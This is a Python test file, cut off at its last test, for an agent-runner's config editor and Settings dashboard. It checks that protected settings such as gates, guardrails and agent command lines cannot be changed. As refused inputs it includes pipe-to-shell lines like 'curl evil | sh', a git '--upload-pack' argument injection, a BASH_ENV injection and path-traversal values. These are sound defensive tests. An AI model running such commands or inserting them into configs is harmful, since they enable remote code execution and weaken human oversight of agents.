"""The Settings page's config edits (`config_edit`), its dashboard routes, and a live runner taking the change."""

from __future__ import annotations

import json
import os
from pathlib import Path

import pytest
import yaml

from agentflow import config_edit, pack, pipeline
from agentflow.config import ConfigError, load_config
from agentflow.config_edit import Conflict, EditError, Refused
from agentflow.pipeline import RunOptions

from conftest import PYTHON_CONFIG
from test_dashboard import dash as dash, payload  # `dash` is a fixture these tests share

AGENTFLOW = Path(__file__).resolve().parents[1]
REPO = AGENTFLOW.parent
SHIPPED = PYTHON_CONFIG.read_text(encoding="utf-8")


@pytest.fixture
def shipped(tmp_cfg) -> Path:
    """The shipped config's exact text (comments, anchors and all) beside the real prompts."""
    path = tmp_cfg()
    path.write_text(SHIPPED, encoding="utf-8")
    return path


def form(path: Path, *changes: tuple[list[str], object]) -> config_edit.Proposal:
    _, sha = config_edit.read(path)
    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=REPO)


def changed_lines(diff: str) -> list[str]:
    return [line for line in diff.splitlines() if line[:1] in "+-" and not line.startswith(("+++", "---"))]


# --------------------------------------------------------------------------- form edits keep the file's layout


def test_a_scalar_change_touches_only_its_value(shipped):
    proposal = form(shipped, (["defaults", "step_timeout_min"], 60))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-  step_timeout_min: 45", "+  step_timeout_min: 60"]
    config_edit.save(shipped, proposal)
    assert load_config(shipped).defaults.step_timeout_min == 60
    assert shipped.read_text(encoding="utf-8") == SHIPPED.replace("step_timeout_min: 45", "step_timeout_min: 60")


def test_a_flow_mapping_is_changed_key_by_key_and_keeps_its_comment(shipped):
    models = {"plan": "opus", "build": "opus", "review": "sonnet", "debug": "opus", "fast": "haiku"}  # drops mechanical
    proposal = form(shipped, (["agents", "claude", "models"], models))
    assert not proposal.errors, proposal.errors
    (removed, added) = changed_lines(proposal.diff)
    assert removed.startswith("-    models: {plan: opus, build: sonnet, mechanical: haiku,")
    assert added == "+    models: {plan: opus, build: opus, review: sonnet, debug: opus, fast: haiku}  # fallback when a phase sets no model"


def test_a_block_mapping_gains_and_loses_lines_in_place(shipped):
    labels = {"feature": "New module", "bug": "Bug", "eval": "Prompt or retrieval change", "design": "Design decision",
              "extra": "Extra"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    # `extra` is not a lane, so `validate` says so and nothing may be saved
    assert [i.path for i in proposal.errors] == ["dashboard.backlog.lane_labels.extra"]
    with pytest.raises(EditError):
        config_edit.save(shipped, proposal)
    del labels["extra"], labels["design"]
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    assert not proposal.errors
    assert changed_lines(proposal.diff) == ["-      bug: Bug fix", "+      bug: Bug", "-      design: Design decision"]
    kinds = {**yaml.safe_load(SHIPPED)["autonomy"]["resolve_kinds"], "blocked": 3}
    kinds["new_kind"] = 1
    lines = changed_lines(form(shipped, (["autonomy", "resolve_kinds"], kinds)).diff)
    assert lines == ["-    blocked: 2", "+    blocked: 3", "+    new_kind: 1"]


def test_a_missing_key_is_added_under_its_block(shipped):
    proposal = form(shipped, (["phases", "ship", "resolve"], True), (["phases", "verify", "model"], "opus"))
    assert not proposal.errors, proposal.errors
    lines = changed_lines(proposal.diff)
    assert "+    resolve: true" in lines and "-    model: sonnet" in lines and "+    model: opus" in lines
    config_edit.save(shipped, proposal)
    cfg = load_config(shipped)
    assert cfg.phases["ship"].resolve is True and cfg.phases["verify"].model == "opus"
    assert cfg.phases["ship"].steps[-1].type == "ci"  # the new line landed in `ship`, not in a step


def test_the_memory_section_saves_a_zero_and_keeps_the_comments(shipped):
    proposal = form(shipped, (["memory", "retro_every_days"], 0))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    text = shipped.read_text(encoding="utf-8")
    assert load_config(shipped).memory.retro_every_days == 0
    assert "retro_every_days: 0" in text
    assert all(line in text for line in SHIPPED.splitlines() if "#" in line)  # every comment survives


def test_an_optional_text_field_set_to_null_removes_the_key(shipped):
    proposal = form(shipped, (["phases", "verify", "model"], None))
    assert changed_lines(proposal.diff) == ["-    model: sonnet"]


def test_values_that_need_quoting_are_quoted(shipped):
    labels = {"feature": "New: module, #1", "bug": "Bug fix", "eval": "x", "design": "y"}
    proposal = form(shipped, (["dashboard", "backlog", "lane_labels"], labels))
    config_edit.save(shipped, proposal)
    assert yaml.safe_load(shipped.read_text(encoding="utf-8"))["dashboard"]["backlog"]["lane_labels"] == labels


# --------------------------------------------------------------------------- what the form refuses


@pytest.mark.parametrize("key, value, error", [
    (["gates", "floor", "run"], "true", Refused),                     # not a form field at all
    (["agents", "claude", "command"], ["sh"], Refused),
    (["defaults", "step_timeout_min"], "60", EditError),               # the field's kind
    (["defaults", "step_timeout_min"], 0, EditError),                  # its bounds
    (["defaults", "push"], False, Refused),                          # removed: `finish` always pushes
    (["context", "rollover_pct"], True, EditError),
    (["context", "max_compactions"], 0, EditError),                    # at least one
    (["context", "context_window_tokens"], 50000, EditError),          # below Claude Code's smallest auto-compact window
    (["memory", "lessons_max_tokens"], 5000, EditError),               # above the range
    (["effort", "allowed"], ["low", "turbo"], EditError),
    (["defaults", "agent"], "nobody", EditError),
    (["autonomy", "resolve_kinds"], {"blocked": 0}, EditError),
    (["dashboard", "backlog", "lane_labels"], {"bug": "two\nlines"}, EditError),
])
def test_the_form_accepts_only_its_fields_with_their_kinds(shipped, key, value, error):
    with pytest.raises(error):
        form(shipped, (key, value))


def test_a_stale_base_is_a_conflict(shipped):
    proposal = form(shipped, (["defaults", "fix_attempts"], 4))
    shipped.write_text(SHIPPED.replace("max_turns: 80", "max_turns: 81"), encoding="utf-8")
    with pytest.raises(Conflict):
        config_edit.save(shipped, proposal)
    with pytest.raises(Conflict):
        config_edit.propose(shipped, proposal.base_sha256, changes=[{"key": ["defaults", "fix_attempts"], "value": 4}])


def test_an_anchored_value_used_elsewhere_is_not_edited_through_the_text():
    text = "a: &x {k: 1}\nb: *x\nc: {k: 1}\n"
    with pytest.raises(EditError, match="anchored"):
        config_edit._edit(text, ("a", "k"), 2)
    assert config_edit._edit(text, ("c", "k"), 2) == "a: &x {k: 1}\nb: *x\nc: {k: 2}\n"


def test_a_symlinked_config_is_refused(shipped, tmp_path):
    link = tmp_path / ".agentflow" / "linked.yaml"
    link.symlink_to(shipped)
    with pytest.raises(EditError, match="symlink"):
        config_edit.read(link)


# --------------------------------------------------------------------------- the YAML tab


def test_yaml_text_may_change_anything_but_the_protected_settings(shipped):
    _, sha = config_edit.read(shipped)
    edited = SHIPPED.replace("lanes: [feature, bug, eval, design]   #", "lanes: [feature, bug, eval, design]  # edited:")
    proposal = config_edit.propose(shipped, sha, text=edited, repo=REPO)
    assert proposal.changed and not proposal.errors
    for old, new in [
        ('floor:        {run: "true"}', 'floor:        {run: "false"}'),
        ('floor:        {run: "true"}', 'floor:        {run: "true", agent_check: true}'),  # a gate the agent runs
        ("    - CONSTRAINTS.md\n", ""),                                                  # guardrails
        ("    command: [claude]", "    command: [sh, -c, claude]"),                     # an agent's command line
        ('    POSTGRES_HOST_PORT: "55432"', '    POSTGRES_HOST_PORT: "55432"\n    BASH_ENV: /tmp/x'),  # defaults.env
        ("  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 3}",
         "  plan_is_small:          {check: plan_tasks, file: \"{plan}\", max: 30}"),   # conditions
        ("    skip_if: build_done\n", ""),                                               # a phase's workflow
        ("  refine_prompt: refine.md", "  refine_prompt: ../../../CONSTRAINTS.md"),       # a file read into prompts
        ("  fork_from: main", "  fork_from: --upload-pack=x"),                          # reaches git
        ('  progress_file: "runs/{run}/progress.md"', '  progress_file: "../../x.md"'),  # a path the runner writes
        ("version: 2\n", "version: 3\n"),                                          # the pack's format
        ('engine: ">=2,<3"', 'engine: ">=2"'),                                      # the engines it runs on
    ]:
        assert old in SHIPPED, old
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


@pytest.mark.parametrize("old, new", [
    ("  commit_trailer:", "  skills_dir: skills\n  commit_trailer:"),                  # project.skills_dir added
    ('    spec_file: "SPEC-{module}.md"', '    spec_file: "{module}-spec.md"'),             # changed
    ('    spec_file: "SPEC-{module}.md"   # a module\'s spec is <specs>/<spec_file>\n', ""),  # removed
    ("    plans: docs/plans\n", '    plans: docs/plans\n    done_status: "^Status: finished"\n'),  # project.docs.done_status
    ("version: 2\n", "version: 2\npaths:\n  state_dir: ../elsewhere\n"),              # paths.state_dir
    ("  path: docs/specs/CAPABILITY-MAP.md", "  path: docs/other.md"),                  # work_source
    ("    ship: finishing-a-development-branch", "    ship: executing-plans"),           # skills.map
])
def test_yaml_text_may_not_change_the_paths_the_runner_reads(shipped, old, new):
    _, sha = config_edit.read(shipped)
    assert old in SHIPPED, old
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=SHIPPED.replace(old, new, 1), repo=REPO)


def test_the_inherited_environment_settings_are_protected(shipped):
    _, sha = config_edit.read(shipped)
    old = '    POSTGRES_HOST_PORT: "55432"\n'
    assert old in SHIPPED
    for added in ('  env_inherit: {drop: ["*_URL"]}\n', "  env_inherit: {drop_dotenv: []}\n"):  # a run's agents see the leak again
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(shipped, sha, text=SHIPPED.replace(old, old + added, 1), repo=REPO)
    for key, value in ((["defaults", "env_inherit", "drop"], ["X"]), (["defaults", "env_inherit", "drop_dotenv"], [])):
        with pytest.raises(Refused):  # the form has no field for it
            form(shipped, (key, value))
    assert "defaults.env_inherit" in config_edit.PROTECTED


def test_yaml_text_may_not_switch_the_work_source_to_specs(shipped):
    _, sha = config_edit.read(shipped)
    lines = SHIPPED.splitlines(keepends=True)
    old = "".join(line for line in lines if line.startswith(("  kind: capability_map", "  path: docs/specs/CAPABILITY")))
    assert old in SHIPPED
    text = SHIPPED.replace(old, "  kind: specs\n", 1)
    assert yaml.safe_load(text)["work_source"] == {"kind": "specs"}
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


def test_worktrees_dir_is_still_refused_by_the_page(shipped):
    _, sha = config_edit.read(shipped)
    with pytest.raises(Refused):
        form(shipped, (["project", "worktrees_dir"], "wt"))
    text = SHIPPED.replace("  branch:", "  worktrees_dir: wt\n  branch:", 1)
    assert "worktrees_dir: wt" in text
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


@pytest.mark.parametrize("key, value", [
    (["project", "skills_dir"], "skills"),
    (["project", "docs", "spec_file"], "{module}-spec.md"),
    (["project", "docs", "done_status"], "^Status: finished"),
    (["paths", "state_dir"], "../elsewhere"),
    (["work_source", "path"], "docs/other.md"),
    (["skills", "map", "ship"], "executing-plans"),
])
def test_the_form_refuses_the_paths_the_runner_reads(shipped, key, value):
    with pytest.raises(Refused):
        form(shipped, (key, value))


@pytest.mark.parametrize("key", ["review", "debug", "review_feedback"])
def test_new_skills_map_keys_are_refused_by_the_page(shipped, key):
    with pytest.raises(Refused):
        form(shipped, (["skills", "map", key], "agentflow-review"))
    _, sha = config_edit.read(shipped)
    line = f"    {key}: "  # the shipped config may already map the key: change its value, else add the key
    text = (SHIPPED.replace(line + "receiving-code-review", line + "agentflow-review", 1) if line + "receiving-code-review" in SHIPPED
            else SHIPPED.replace("    ship: finishing-a-development-branch",
                                 f"{line}agentflow-review\n    ship: finishing-a-development-branch", 1))
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(shipped, sha, text=text, repo=REPO)


def test_yaml_text_that_does_not_load_or_validate_reports_why(shipped):
    _, sha = config_edit.read(shipped)
    broken = config_edit.propose(shipped, sha, text="version: [", repo=REPO)
    assert broken.errors and "not valid YAML" in broken.errors[0].message
    invalid = config_edit.propose(shipped, sha, text=SHIPPED.replace("  default: medium ", "  default: turbo  "), repo=REPO)
    assert [i.path for i in invalid.errors] == ["effort.default"]


def test_save_replaces_the_file_and_keeps_its_mode(shipped):
    os.chmod(shipped, 0o640)
    proposal = form(shipped, (["ci", "poll_s"], 30))
    digest = config_edit.save(shipped, proposal)
    assert config_edit.read(shipped)[1] == digest
    assert shipped.stat().st_mode & 0o777 == 0o640
    assert not [p for p in shipped.parent.iterdir() if p.name.startswith(".config")]  # no temp files left


def test_form_fields_carry_values_and_the_lines_comments(shipped):
    data = config_edit.form_fields(shipped)
    fields = {tuple(f["key"]): f for s in data["sections"] for f in s["fields"]}
    assert fields[("defaults", "fix_attempts")]["value"] == 3
    assert fields[("defaults", "fix_attempts")]["help"].startswith("gate failure")
    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
    assert fields[("phases", "build", "model")]["kind"] == "map"
    assert ("gates", "floor", "run") not in fields and data["text"] == SHIPPED


# --------------------------------------------------------------------------- the dashboard routes


def test_settings_routes_need_the_token(dash):
    assert dash.get("/api/config", token=None)[0] == 403
    assert dash.post("/api/config/save", {"base_sha256": "x", "changes": []}, token=None)[0] == 403


def test_settings_preview_and_save_reach_the_dashboard_at_once(dash):
    status, _, body = dash.get("/api/config")
    data = payload(body)
    assert status == 200 and data["sha256"] and data["sections"]
    change = {"base_sha256": data["sha256"], "changes": [{"key": ["dashboard", "show_done_days"], "value": 3}]}
    status, _, body = dash.post("/api/config/preview", change)
    preview = payload(body)
    assert status == 200 and preview["ok"] and "+  show_done_days: 3" in preview["diff"]
    assert dash.server.cfg.dashboard["show_done_days"] != 3  # a preview writes nothing

    status, _, body = dash.post("/api/config/save", change)
    assert status == 200 and payload(body)["saved"] is True
    assert dash.server.cfg.dashboard["show_done_days"] == 3
    assert load_config(dash.server.cfg.path).dashboard["show_done_days"] == 3

    status, _, body = dash.post("/api/config/save", change)  # the same base again: the file moved on
    assert status == 409 and "changed since" in payload(body)["error"]


def test_settings_save_refuses_protected_and_invalid_changes(dash):
    data = payload(dash.get("/api/config")[2])
    raw = yaml.safe_load(data["text"])
    raw["gates"]["ok"]["run"] = "curl example.invalid | sh"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and "protected" in payload(body)["error"]

    raw = yaml.safe_load(data["text"])
    raw["effort"]["default"] = "turbo"
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": yaml.safe_dump(raw, sort_keys=False)})
    assert status == 400 and payload(body)["ok"] is False
    assert config_edit.read(Path(dash.server.cfg.path))[1] == data["sha256"]  # nothing was written

    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"]})
    assert status == 400


def test_the_yaml_tab_may_send_the_whole_file(dash):
    data = payload(dash.get("/api/config")[2])
    big = data["text"] + "#" + "x" * (70 * 1024) + "\n"  # past the 64 KB of the other routes
    status, _, body = dash.post("/api/config/save", {"base_sha256": data["sha256"], "text": big})
    assert status == 200, body
    assert payload(body)["saved"] is True


# --------------------------------------------------------------------------- a live runner takes the change


def _loop(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: Path(flow_repo.cfg.path))  # the run's repo's own pack
    run = flow_repo.new_run()
    return pipeline._Loop(run, flow_repo.cfg, RunOptions()), run


def _rewrite(path: Path, edit) -> None:
    data = yaml.safe_load(path.read_text(encoding="utf-8"))
    edit(data)
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")


def test_a_live_runner_reloads_the_shipped_config_before_a_phase(flow_repo, monkeypatch):
    loop, run = _loop(flow_repo, monkeypatch)
    loop.reload()
    assert not [e for e in run.events.read() if e["type"].startswith("config_reload")]  # unchanged: nothing
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg.defaults.step_timeout_min == 7
    assert [e["type"] for e in run.events.read()][-1] == "config_reloaded"


@pytest.mark.parametrize("edit, reason", [
    (lambda d: d["effort"].update(default="turbo"), "effort.default"),
    (lambda d: d.update(phases=dict(reversed(list(d["phases"].items())))), "phases' names or order"),
])
def test_a_live_runner_keeps_its_config_when_the_new_one_is_not_usable(flow_repo, monkeypatch, edit, reason):
    loop, run = _loop(flow_repo, monkeypatch)
    before = loop.cfg
    _rewrite(Path(flow_repo.cfg.path), edit)
    loop.reload()
    assert loop.cfg is before
    last = run.events.read()[-1]
    assert last["type"] == "config_reload_skipped" and reason in last["reason"]
    loop.reload()  # the same broken file is reported once
    assert run.events.read()[-1]["seq"] == last["seq"]


def test_a_runner_on_another_config_never_reloads_it(flow_repo, monkeypatch):
    monkeypatch.setattr(pack, "pack_config", lambda repo: PYTHON_CONFIG)
    run = flow_repo.new_run()
    loop = pipeline._Loop(run, flow_repo.cfg, RunOptions())
    _rewrite(Path(flow_repo.cfg.path), lambda d: d["defaults"].update(step_timeout_min=7))
    loop.reload()
    assert loop.cfg is flow_repo.cfg
    assert json.dumps([e["type"] for e in run.events.read()]).count("config_reload") == 0


# --------------------------------------------------------------------------- a sparse pack: the form reads the layers


def _sparse(sparse_repo: Path) -> Path:
    return pack.pack_config(sparse_repo)


def _fields(path: Path) -> dict:
    return {tuple(f["key"]): f for s in config_edit.form_fields(path)["sections"] for f in s["fields"]}


def _user_file(data: dict) -> Path:
    from agentflow import layers

    target = layers.user_config_path()
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(yaml.safe_dump(data), encoding="utf-8")
    return target


def _sparse_form(path: Path, *changes) -> config_edit.Proposal:
    _, sha = config_edit.read(path)
    return config_edit.propose(path, sha, changes=[{"key": k, "value": v} for k, v in changes], repo=path.parents[1])


def test_form_shows_the_effective_value_its_layer_and_its_help(sparse_repo):
    path = _sparse(sparse_repo)
    fields = _fields(path)
    timeout = fields[("defaults", "step_timeout_min")]
    assert (timeout["value"], timeout["source"], timeout["present"]) == (45, "engine", False)
    assert fields[("defaults", "task_budget_usd")]["help"] == "the soft budget grows to fit the plan"  # the engine's comment
    hard = fields[("defaults", "run_budget_hard_usd")]
    assert (hard["value"], hard["source"], hard["present"]) == (65, "engine", False)
    assert hard["help"].startswith("hard: the run stops")
    models = fields[("agents", "claude", "models")]
    assert models["source"] == "engine" and models["value"]["plan"] == "opus" and not models.get("readonly")
    assert fields[("phases", "build", "resolve")]["value"] is True
    assert fields[("phases", "build", "resolve")]["source"] == "engine"
    assert ("hitl", "remind_after_h") in fields                          # a section the pack never wrote
    assert fields[("hitl", "remind_after_h")]["present"] is False
    path.write_text(path.read_text(encoding="utf-8") + "defaults:\n  fix_attempts: 5  # mine\n", encoding="utf-8")
    fields = _fields(path)
    mine = fields[("defaults", "fix_attempts")]
    assert (mine["value"], mine["source"], mine["present"], mine["help"]) == (5, "project", True, "mine")


def test_form_saves_a_phase_knob_into_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    before = load_config(path)
    proposal = _sparse_form(path, (["phases", "plan", "needs_approval"], False))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["phases"] == {"plan": {"needs_approval": False}}
    after = load_config(path)
    assert after.phases["plan"].needs_approval is False
    assert list(after.phases) == list(before.phases)
    assert {n: p.steps for n, p in after.phases.items()} == {n: p.steps for n, p in before.phases.items()}


def test_form_saves_an_agent_model_into_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    models = {**_fields(path)[("agents", "claude", "models")]["value"], "build": "opus"}  # the page sends the whole map
    proposal = _sparse_form(path, (["agents", "claude", "models"], models))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"] == {
        "permission_mode": "bypassPermissions", "models": {"build": "opus"}}
    assert load_config(path).agents["claude"].models == models


def test_form_offers_agents_and_lanes_on_a_sparse_pack(sparse_repo):
    path = _sparse(sparse_repo)
    path.write_text(path.read_text(encoding="utf-8") + "dashboard:\n  backlog:\n    sync_base: true\n", encoding="utf-8")
    data = config_edit.form_fields(path)
    titles = [s["title"] for s in data["sections"]]
    assert "Agent: claude" in titles and "Agent: codex" in titles and "Phases" in titles
    fields = _fields(path)
    assert fields[("defaults", "agent")]["options"] == ["claude", "codex"]
    assert fields[("dashboard", "backlog", "module_lane")]["options"] == ["feature", "bug"]
    proposal = _sparse_form(path, (["dashboard", "backlog", "module_lane"], "bug"), (["defaults", "agent"], "codex"),
                            (["agents", "codex", "enabled"], True))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    cfg = load_config(path)
    assert cfg.dashboard["backlog"]["module_lane"] == "bug" and cfg.defaults.agent == "codex"
    assert cfg.agents["codex"].command == ["codex"]  # the engine's command line, untouched
    with pytest.raises(EditError):
        _sparse_form(path, (["dashboard", "backlog", "module_lane"], "eval"))  # not a lane of the engine workflow


def test_a_field_set_in_the_user_file_is_refused_on_save(sparse_repo):
    path = _sparse(sparse_repo)
    user = _user_file({"defaults": {"run_budget_usd": 9}})
    budget = _fields(path)[("defaults", "run_budget_usd")]
    assert (budget["value"], budget["source"]) == (9, "user")
    assert budget["readonly"] == f"set in your user config ({user}), which overrides the pack"
    text = path.read_text(encoding="utf-8")
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["defaults", "run_budget_usd"], 10))
    assert path.read_text(encoding="utf-8") == text
    assert not _sparse_form(path, (["defaults", "step_timeout_min"], 50)).errors  # the rest of the form still saves


def test_the_settings_form_has_a_soft_and_a_hard_budget(shipped):
    fields = _fields(shipped)
    soft, hard = fields[("defaults", "run_budget_usd")], fields[("defaults", "run_budget_hard_usd")]
    assert soft["label"] == "Soft budget (USD, new runs): notify only"
    assert hard["label"] == "Hard budget (USD, new runs): the run stops for approval"
    assert (hard["kind"], hard["min"], hard["exclusive_min"]) == ("number", 0, True)
    proposal = form(shipped, (["defaults", "run_budget_hard_usd"], 80))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).defaults.run_budget_hard_usd == 80
    below = form(shipped, (["defaults", "run_budget_hard_usd"], 10))  # under the pack's soft budget of 25
    assert "defaults.run_budget_hard_usd" in [i.path for i in below.errors]
    with pytest.raises(EditError):
        form(shipped, (["defaults", "run_budget_hard_usd"], 0))


def test_the_settings_form_has_the_question_kinds_only_a_human_answers(shipped, sparse_repo):
    from agentflow.config import QUESTION_KINDS

    fields = _fields(shipped)
    kinds = fields[("autonomy", "human_question_kinds")]
    assert kinds["label"] == "Question kinds only a human answers"
    assert (kinds["kind"], kinds["options"], kinds["value"]) == ("list", list(QUESTION_KINDS), ["boundary"])
    assert "boundary" in QUESTION_KINDS
    proposal = form(shipped, (["autonomy", "human_question_kinds"], ["boundary", "spec_gap"]))
    assert not proposal.errors, proposal.errors
    config_edit.save(shipped, proposal)
    assert load_config(shipped).autonomy["human_question_kinds"] == ["boundary", "spec_gap"]
    with pytest.raises(EditError):
        form(shipped, (["autonomy", "human_question_kinds"], ["taste"]))  # not a question kind
    sparse = _fields(_sparse(sparse_repo))
    assert sparse[("autonomy", "human_question_kinds")]["help"] == "never answered by the runner"  # the engine's comment
    assert sparse[("autonomy", "answer_recommended")]["help"] == "in every phase, except kinds in human_question_kinds"


def test_a_hard_budget_set_in_the_user_file_is_read_only(sparse_repo):
    path = _sparse(sparse_repo)
    user = _user_file({"defaults": {"run_budget_hard_usd": 90}})
    hard = _fields(path)[("defaults", "run_budget_hard_usd")]
    assert (hard["value"], hard["source"]) == (90, "user")
    assert hard["readonly"] == f"set in your user config ({user}), which overrides the pack"
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["defaults", "run_budget_hard_usd"], 100))


def test_a_map_with_a_user_entry_is_refused_on_save(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"agents": {"claude": {"models": {"build": "sonnet"}}}})
    models = _fields(path)[("agents", "claude", "models")]
    assert "user config" in models["readonly"] and models["source"] == "user"
    with pytest.raises(Refused, match="user config"):
        _sparse_form(path, (["agents", "claude", "models"], {**models["value"], "plan": "sonnet"}))
    assert not _fields(path)[("agents", "codex", "models")].get("readonly")


def test_hitl_notify_from_the_user_file_stays_protected_and_names_its_layer(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"hitl": {"notify": [{"type": "terminal_bell"}]}})
    data = config_edit.form_fields(path)
    assert ("hitl", "notify") not in _fields(path) and "hitl.notify" in data["protected"]
    assert data["protected_sources"]["hitl.notify"] == "user"
    assert not _sparse_form(path, (["hitl", "remind_after_h"], 2)).errors  # the protected view is unchanged


def test_saving_an_inherited_map_writes_only_the_changed_entry(sparse_repo):
    path = _sparse(sparse_repo)
    kinds = {**_fields(path)[("autonomy", "resolve_kinds")]["value"], "blocked": 3, "new_kind": 1}
    proposal = _sparse_form(path, (["autonomy", "resolve_kinds"], kinds))
    assert not proposal.errors, proposal.errors
    assert sorted(changed_lines(proposal.diff)) == ["+autonomy: {resolve_kinds: {blocked: 3, new_kind: 1}}"]
    config_edit.save(path, proposal)
    assert load_config(path).autonomy["resolve_kinds"] == kinds
    help_text = _fields(path)[("autonomy", "resolve_kinds")]["help"]
    assert "null" in help_text and "YAML" in help_text  # how to drop an inherited entry


def test_a_protected_change_on_a_sparse_pack_is_still_refused(sparse_repo):
    path = _sparse(sparse_repo)
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    raw["gates"]["extra"] = {"run": "curl example.invalid | sh"}
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    for extra in ("guardrails:\n  forbidden_paths: []\n  user_only_skills: [x]\n",
                  "conditions:\n  plan_is_small: {check: plan_tasks, file: \"{plan}\", max: 30}\n"):
        with pytest.raises(Refused, match="protected"):
            config_edit.propose(path, sha, text=text + extra, repo=sparse_repo)
    raw = yaml.safe_load(text)
    raw["agents"]["codex"] = {"command": ["sh"]}  # an engine agent's command line, changed from a sparse pack
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    with pytest.raises(Refused):
        _sparse_form(path, (["agents", "claude", "command"], ["sh"]))
    assert config_edit.read(path)[1] == sha


def test_the_protected_hold_stays_on_when_the_user_file_does_not_load_against_the_pack(sparse_repo):
    path = _sparse(sparse_repo)
    _user_file({"agents": {"mine": {"models": {"build": "x"}}}})  # personal, but for another repository's agent
    with pytest.raises(ConfigError):
        load_config(path)
    text, sha = config_edit.read(path)
    raw = yaml.safe_load(text)
    raw["gates"]["unit"]["run"] = "curl example.invalid | sh"
    with pytest.raises(Refused, match="protected"):  # the new pack does not load with the user file either
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["agents"]["mine"] = {"command": ["sh", "-c", "evil"], "models": {"build": "x"}}  # now it loads with it
    with pytest.raises(Refused, match="protected"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    del raw["gates"]["unit"]["run"], raw["agents"]["mine"]["models"]
    raw["gates"]["unit"]["run"] = "true"
    with pytest.raises(Refused, match="agents"):  # an added agent's command line alone
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    proposal = _sparse_form(path, (["defaults", "step_timeout_min"], 50))  # the form: not refused, but not saved
    assert proposal.errors and "mine" in proposal.errors[0].message
    with pytest.raises(EditError):
        config_edit.save(path, proposal)
    assert config_edit.read(path)[1] == sha
    assert _fields(path)[("defaults", "step_timeout_min")]["source"] == "engine"  # the form still shows the layers


def test_a_nulled_inherited_map_entry_stays_deleted_after_a_form_save(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["agents"]["claude"]["models"] = {"mechanical": None}
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    models = _fields(path)[("agents", "claude", "models")]["value"]
    assert "mechanical" not in models
    proposal = _sparse_form(path, (["agents", "claude", "models"], {**models, "build": "opus"}))
    assert not proposal.errors, proposal.errors
    config_edit.save(path, proposal)
    assert yaml.safe_load(path.read_text(encoding="utf-8"))["agents"]["claude"]["models"] == {
        "mechanical": None, "build": "opus"}
    effective = load_config(path).agents["claude"].models
    assert "mechanical" not in effective and effective["build"] == "opus"


def _ref_pack(path: Path) -> dict:
    """The sparse pack with its gate's command behind a reference to a key that is not protected."""
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    raw["gates"]["unit"]["run"] = "@defaults.gate_cmd"
    raw["defaults"] = {"gate_cmd": "true"}
    path.write_text(yaml.safe_dump(raw, sort_keys=False), encoding="utf-8")
    return raw


def test_a_reference_into_the_user_file_cannot_slip_a_protected_change_through(sparse_repo):
    path = _sparse(sparse_repo)
    raw = _ref_pack(path)
    _user_file({"hitl": {"notify": ["desktop"]}})  # the engine ships `hitl: {}`: only the user file has this key
    _, sha = config_edit.read(path)
    raw["defaults"]["gate_cmd"] = "curl evil | sh"
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # now the new pack loads only with the user file
    with pytest.raises(Refused, match="gates"):
        config_edit.propose(path, sha, text=yaml.safe_dump(raw, sort_keys=False), repo=sparse_repo)
    assert load_config(path).raw["gates"]["unit"]["run"] == "true" and config_edit.read(path)[1] == sha


def test_a_pack_that_loads_only_with_the_user_file_is_an_error(sparse_repo):
    path = _sparse(sparse_repo)
    raw = yaml.safe_load(path.read_text(encoding="utf-8"))
    _user_file({"hitl": {"notify": ["desktop"]}})
    _, sha = config_edit.read(path)
    raw["dashboard"] = {"x_ref": "@hitl.notify"}  # benign, but it breaks for a teammate and for CI
